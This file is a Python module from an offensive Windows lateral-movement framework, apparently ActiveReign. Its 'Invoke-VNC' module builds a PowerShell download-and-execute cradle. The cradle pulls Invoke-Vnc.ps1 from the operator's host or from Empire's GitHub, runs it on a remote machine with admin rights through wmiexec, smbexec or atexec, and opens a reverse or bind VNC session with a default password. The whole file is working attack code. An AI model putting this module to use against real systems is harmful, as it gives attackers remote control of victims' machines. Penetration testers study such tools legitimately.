from ar3.helpers import powershell
from ar3.helpers.misc import get_local_ip
from ar3.ops.enum.host_enum import code_execution

class InvokeVNC():
    def __init__(self):
        self.name           = 'Invoke-VNC'
        self.description    = 'Load VNC client into memory to create a session on the system'
        self.author         = ['@m8r0wn']
        self.credit         = ['@EmpireProject']
        self.requires_admin = True
        self.exec_methods   = ['wmiexec', 'smbexec', 'atexec']
        self.args = {
            'CONTYPE'   : {
                'Description'   : 'Type of payload to use {reverse, bind}',
                'Required'      : False,
                'Value'         : 'reverse'
            },
            'IPADDRESS' : {
                'Description'   : 'IP address of VNC listener',
                'Required'      : False,
                'Value'         : ''
            },
            'PORT'      : {
                'Description'   : 'VNC Port',
                'Required'      : False,
                'Value'         : '5900'
            },
            'PASSWORD'  : {
                'Description'   : 'VNC Password (Default: ar3vnc)',
                'Required'      : False,
                'Value'         : 'ar3vnc'
            }
        }

    def run(self, target, args, smb_con, loggers, config_obj):
        cmd = ''
        logger = loggers['console']
        timeout = args.timeout
        loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), 'Attempting Invoke-VNC'])
        try:
            # Define Script Source
            if args.fileless:
                srv_addr = get_local_ip()
                script_location = 'http://{}/Invoke-Vnc.ps1'.format(srv_addr)
                setattr(args, 'timeout', timeout + 30)
            else:
                script_location = 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/management/Invoke-Vnc.ps1'
                setattr(args, 'timeout', timeout + 15)
            logger.debug('Script source: {}'.format(script_location))

            # Setup PS1 Script
            if self.args['CONTYPE']['Value'] == 'reverse':
                if not self.args['IPADDRESS']['Value']:
                    self.args['IPADDRESS']['Value'] = get_local_ip()

                cmd = """Invoke-Vnc -ConType reverse -IpAddress {} -Port {} -Password {}""".format(self.args['IPADDRESS']['Value'],self.args['PORT']['Value'],self.args['PASSWORD']['Value'])

            elif self.args['CONTYPE']['Value'] == 'bind':
                cmd = """Invoke-Vnc -ConType bind -Port {} -Password {}""".format(self.args['PORT']['Value'],self.args['PASSWORD']['Value'])

            else:
                loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(), "Invalid CONTYPE"])
                exit(1)

            launcher = powershell.gen_ps_iex_cradle(script_location, cmd)

            # Execute
            cmd = powershell.create_ps_command(launcher, loggers['console'], force_ps32=args.force_ps32, no_obfs=args.no_obfs, server_os=smb_con.os)
            x = code_execution(smb_con, args, target, loggers, config_obj, cmd, return_data=True)

            # Display Output
            if not x.startswith('Code execution failed'):
                for line in x.splitlines():
                    loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), line])
            else:
                loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), "Command execute with no output"])
        except Exception as e:
            logger.debug("{} Error: {}".format(self.name, str(e)))